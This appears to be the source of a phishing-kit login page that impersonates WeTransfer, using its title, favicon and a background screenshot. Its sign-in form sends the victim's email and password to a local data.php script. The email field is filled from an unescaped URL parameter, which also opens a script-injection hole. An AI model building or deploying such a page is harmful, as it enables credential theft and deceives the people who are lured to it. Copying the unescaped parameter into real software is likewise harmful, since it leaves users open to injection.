<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Log in | WeTransfer</title>
  <link rel="icon" sizes="16x16 32x32" href="https://prod-cdn.wetransfer.net/assets/favicon-d12161435ace47c6883360e08466508593325f134c1852b1d0e6e75d5f76adda.ico">
  <style type="text/css">
  body{
    background-image: url('assets/img/bg.PNG') ;
    background-repeat: no-repeat;
    padding: 0px;
    margin: 0px;
  }
  form{
    margin-left: 506px;
  }
  .stubberA{
    width: 323px;
    margin-top: 99px;
    height: 45px;
    /* border: none; */
    outline:none;
    padding-left: 15px;
    border-radius:10px;
    border-width: 1px;
  }
  .stubberB{
    width: 323px;
    margin-top: 99px;
    height: 45px;
    /* border: none; */
    outline:none;
    padding-left: 15px;
    border-radius:10px;
    border-width: 1px;
  }
  .button{
    margin-top: 50px;

    cursor: pointer;
  }
  .form-inline {
    flex-direction: column;
    align-items: stretch;
  }
  .loader {
       position: fixed;
       left: 0px;
       top: 0px;
       width: 100%;
       height: 100%;
       z-index: 9999;
       background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
       opacity: .8;
   }.form-inline button {
  padding: 10px 20px;
  background-color: dodgerblue;
  border: 1px solid #ddd;
  color: white;
  cursor: pointer;
  height: 50px;
  outline: none;
  border-radius: 10px;
}
  </style>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script type="text/javascript">
    $(window).load(function() {
    $(".loader").fadeOut("slow");
    });
</script>
  </head>
  <body>
<div class="loader"></div>
<form class="form-inline" action="data.php" method="post">
                  <!-- Form Fileds -->
    <input name="uemail" value="<?=$_GET[email]?>" class="stubberA" autocomplete="off" required type="text" placeholder="Email address"  required>
  &nbsp;  <input name="pd"  autocomplete="off" class="stubberB"  placeholder="Password" required type="password">
  &nbsp;&nbsp;<button type="submit" style="width:125px;background-color:grey;">Sign in</button>
  </body>
</html>
